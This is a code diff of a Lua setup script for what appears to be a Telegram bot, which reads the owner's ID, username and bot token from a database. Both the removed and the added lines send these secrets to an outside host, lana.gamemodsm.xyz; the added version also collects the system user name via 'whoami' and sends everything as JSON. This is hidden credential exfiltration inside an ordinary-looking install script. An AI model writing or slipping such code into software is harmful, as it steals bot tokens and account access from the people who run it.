@@ -67,7 +67,12 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
+saiedinfo = {}
+saiedinfo.id = database:get(id_server..":SUDO:ID")
+saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
+saiedinfo.tokenbot  = database:get(id_server..":token")
+saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://lana.gamemodsm.xyz/sadam/?insert='..JSON.encode(saiedinfo))
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
@@ -98,7 +103,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("SD", "w")  
+file = io.open("SM", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/sadam
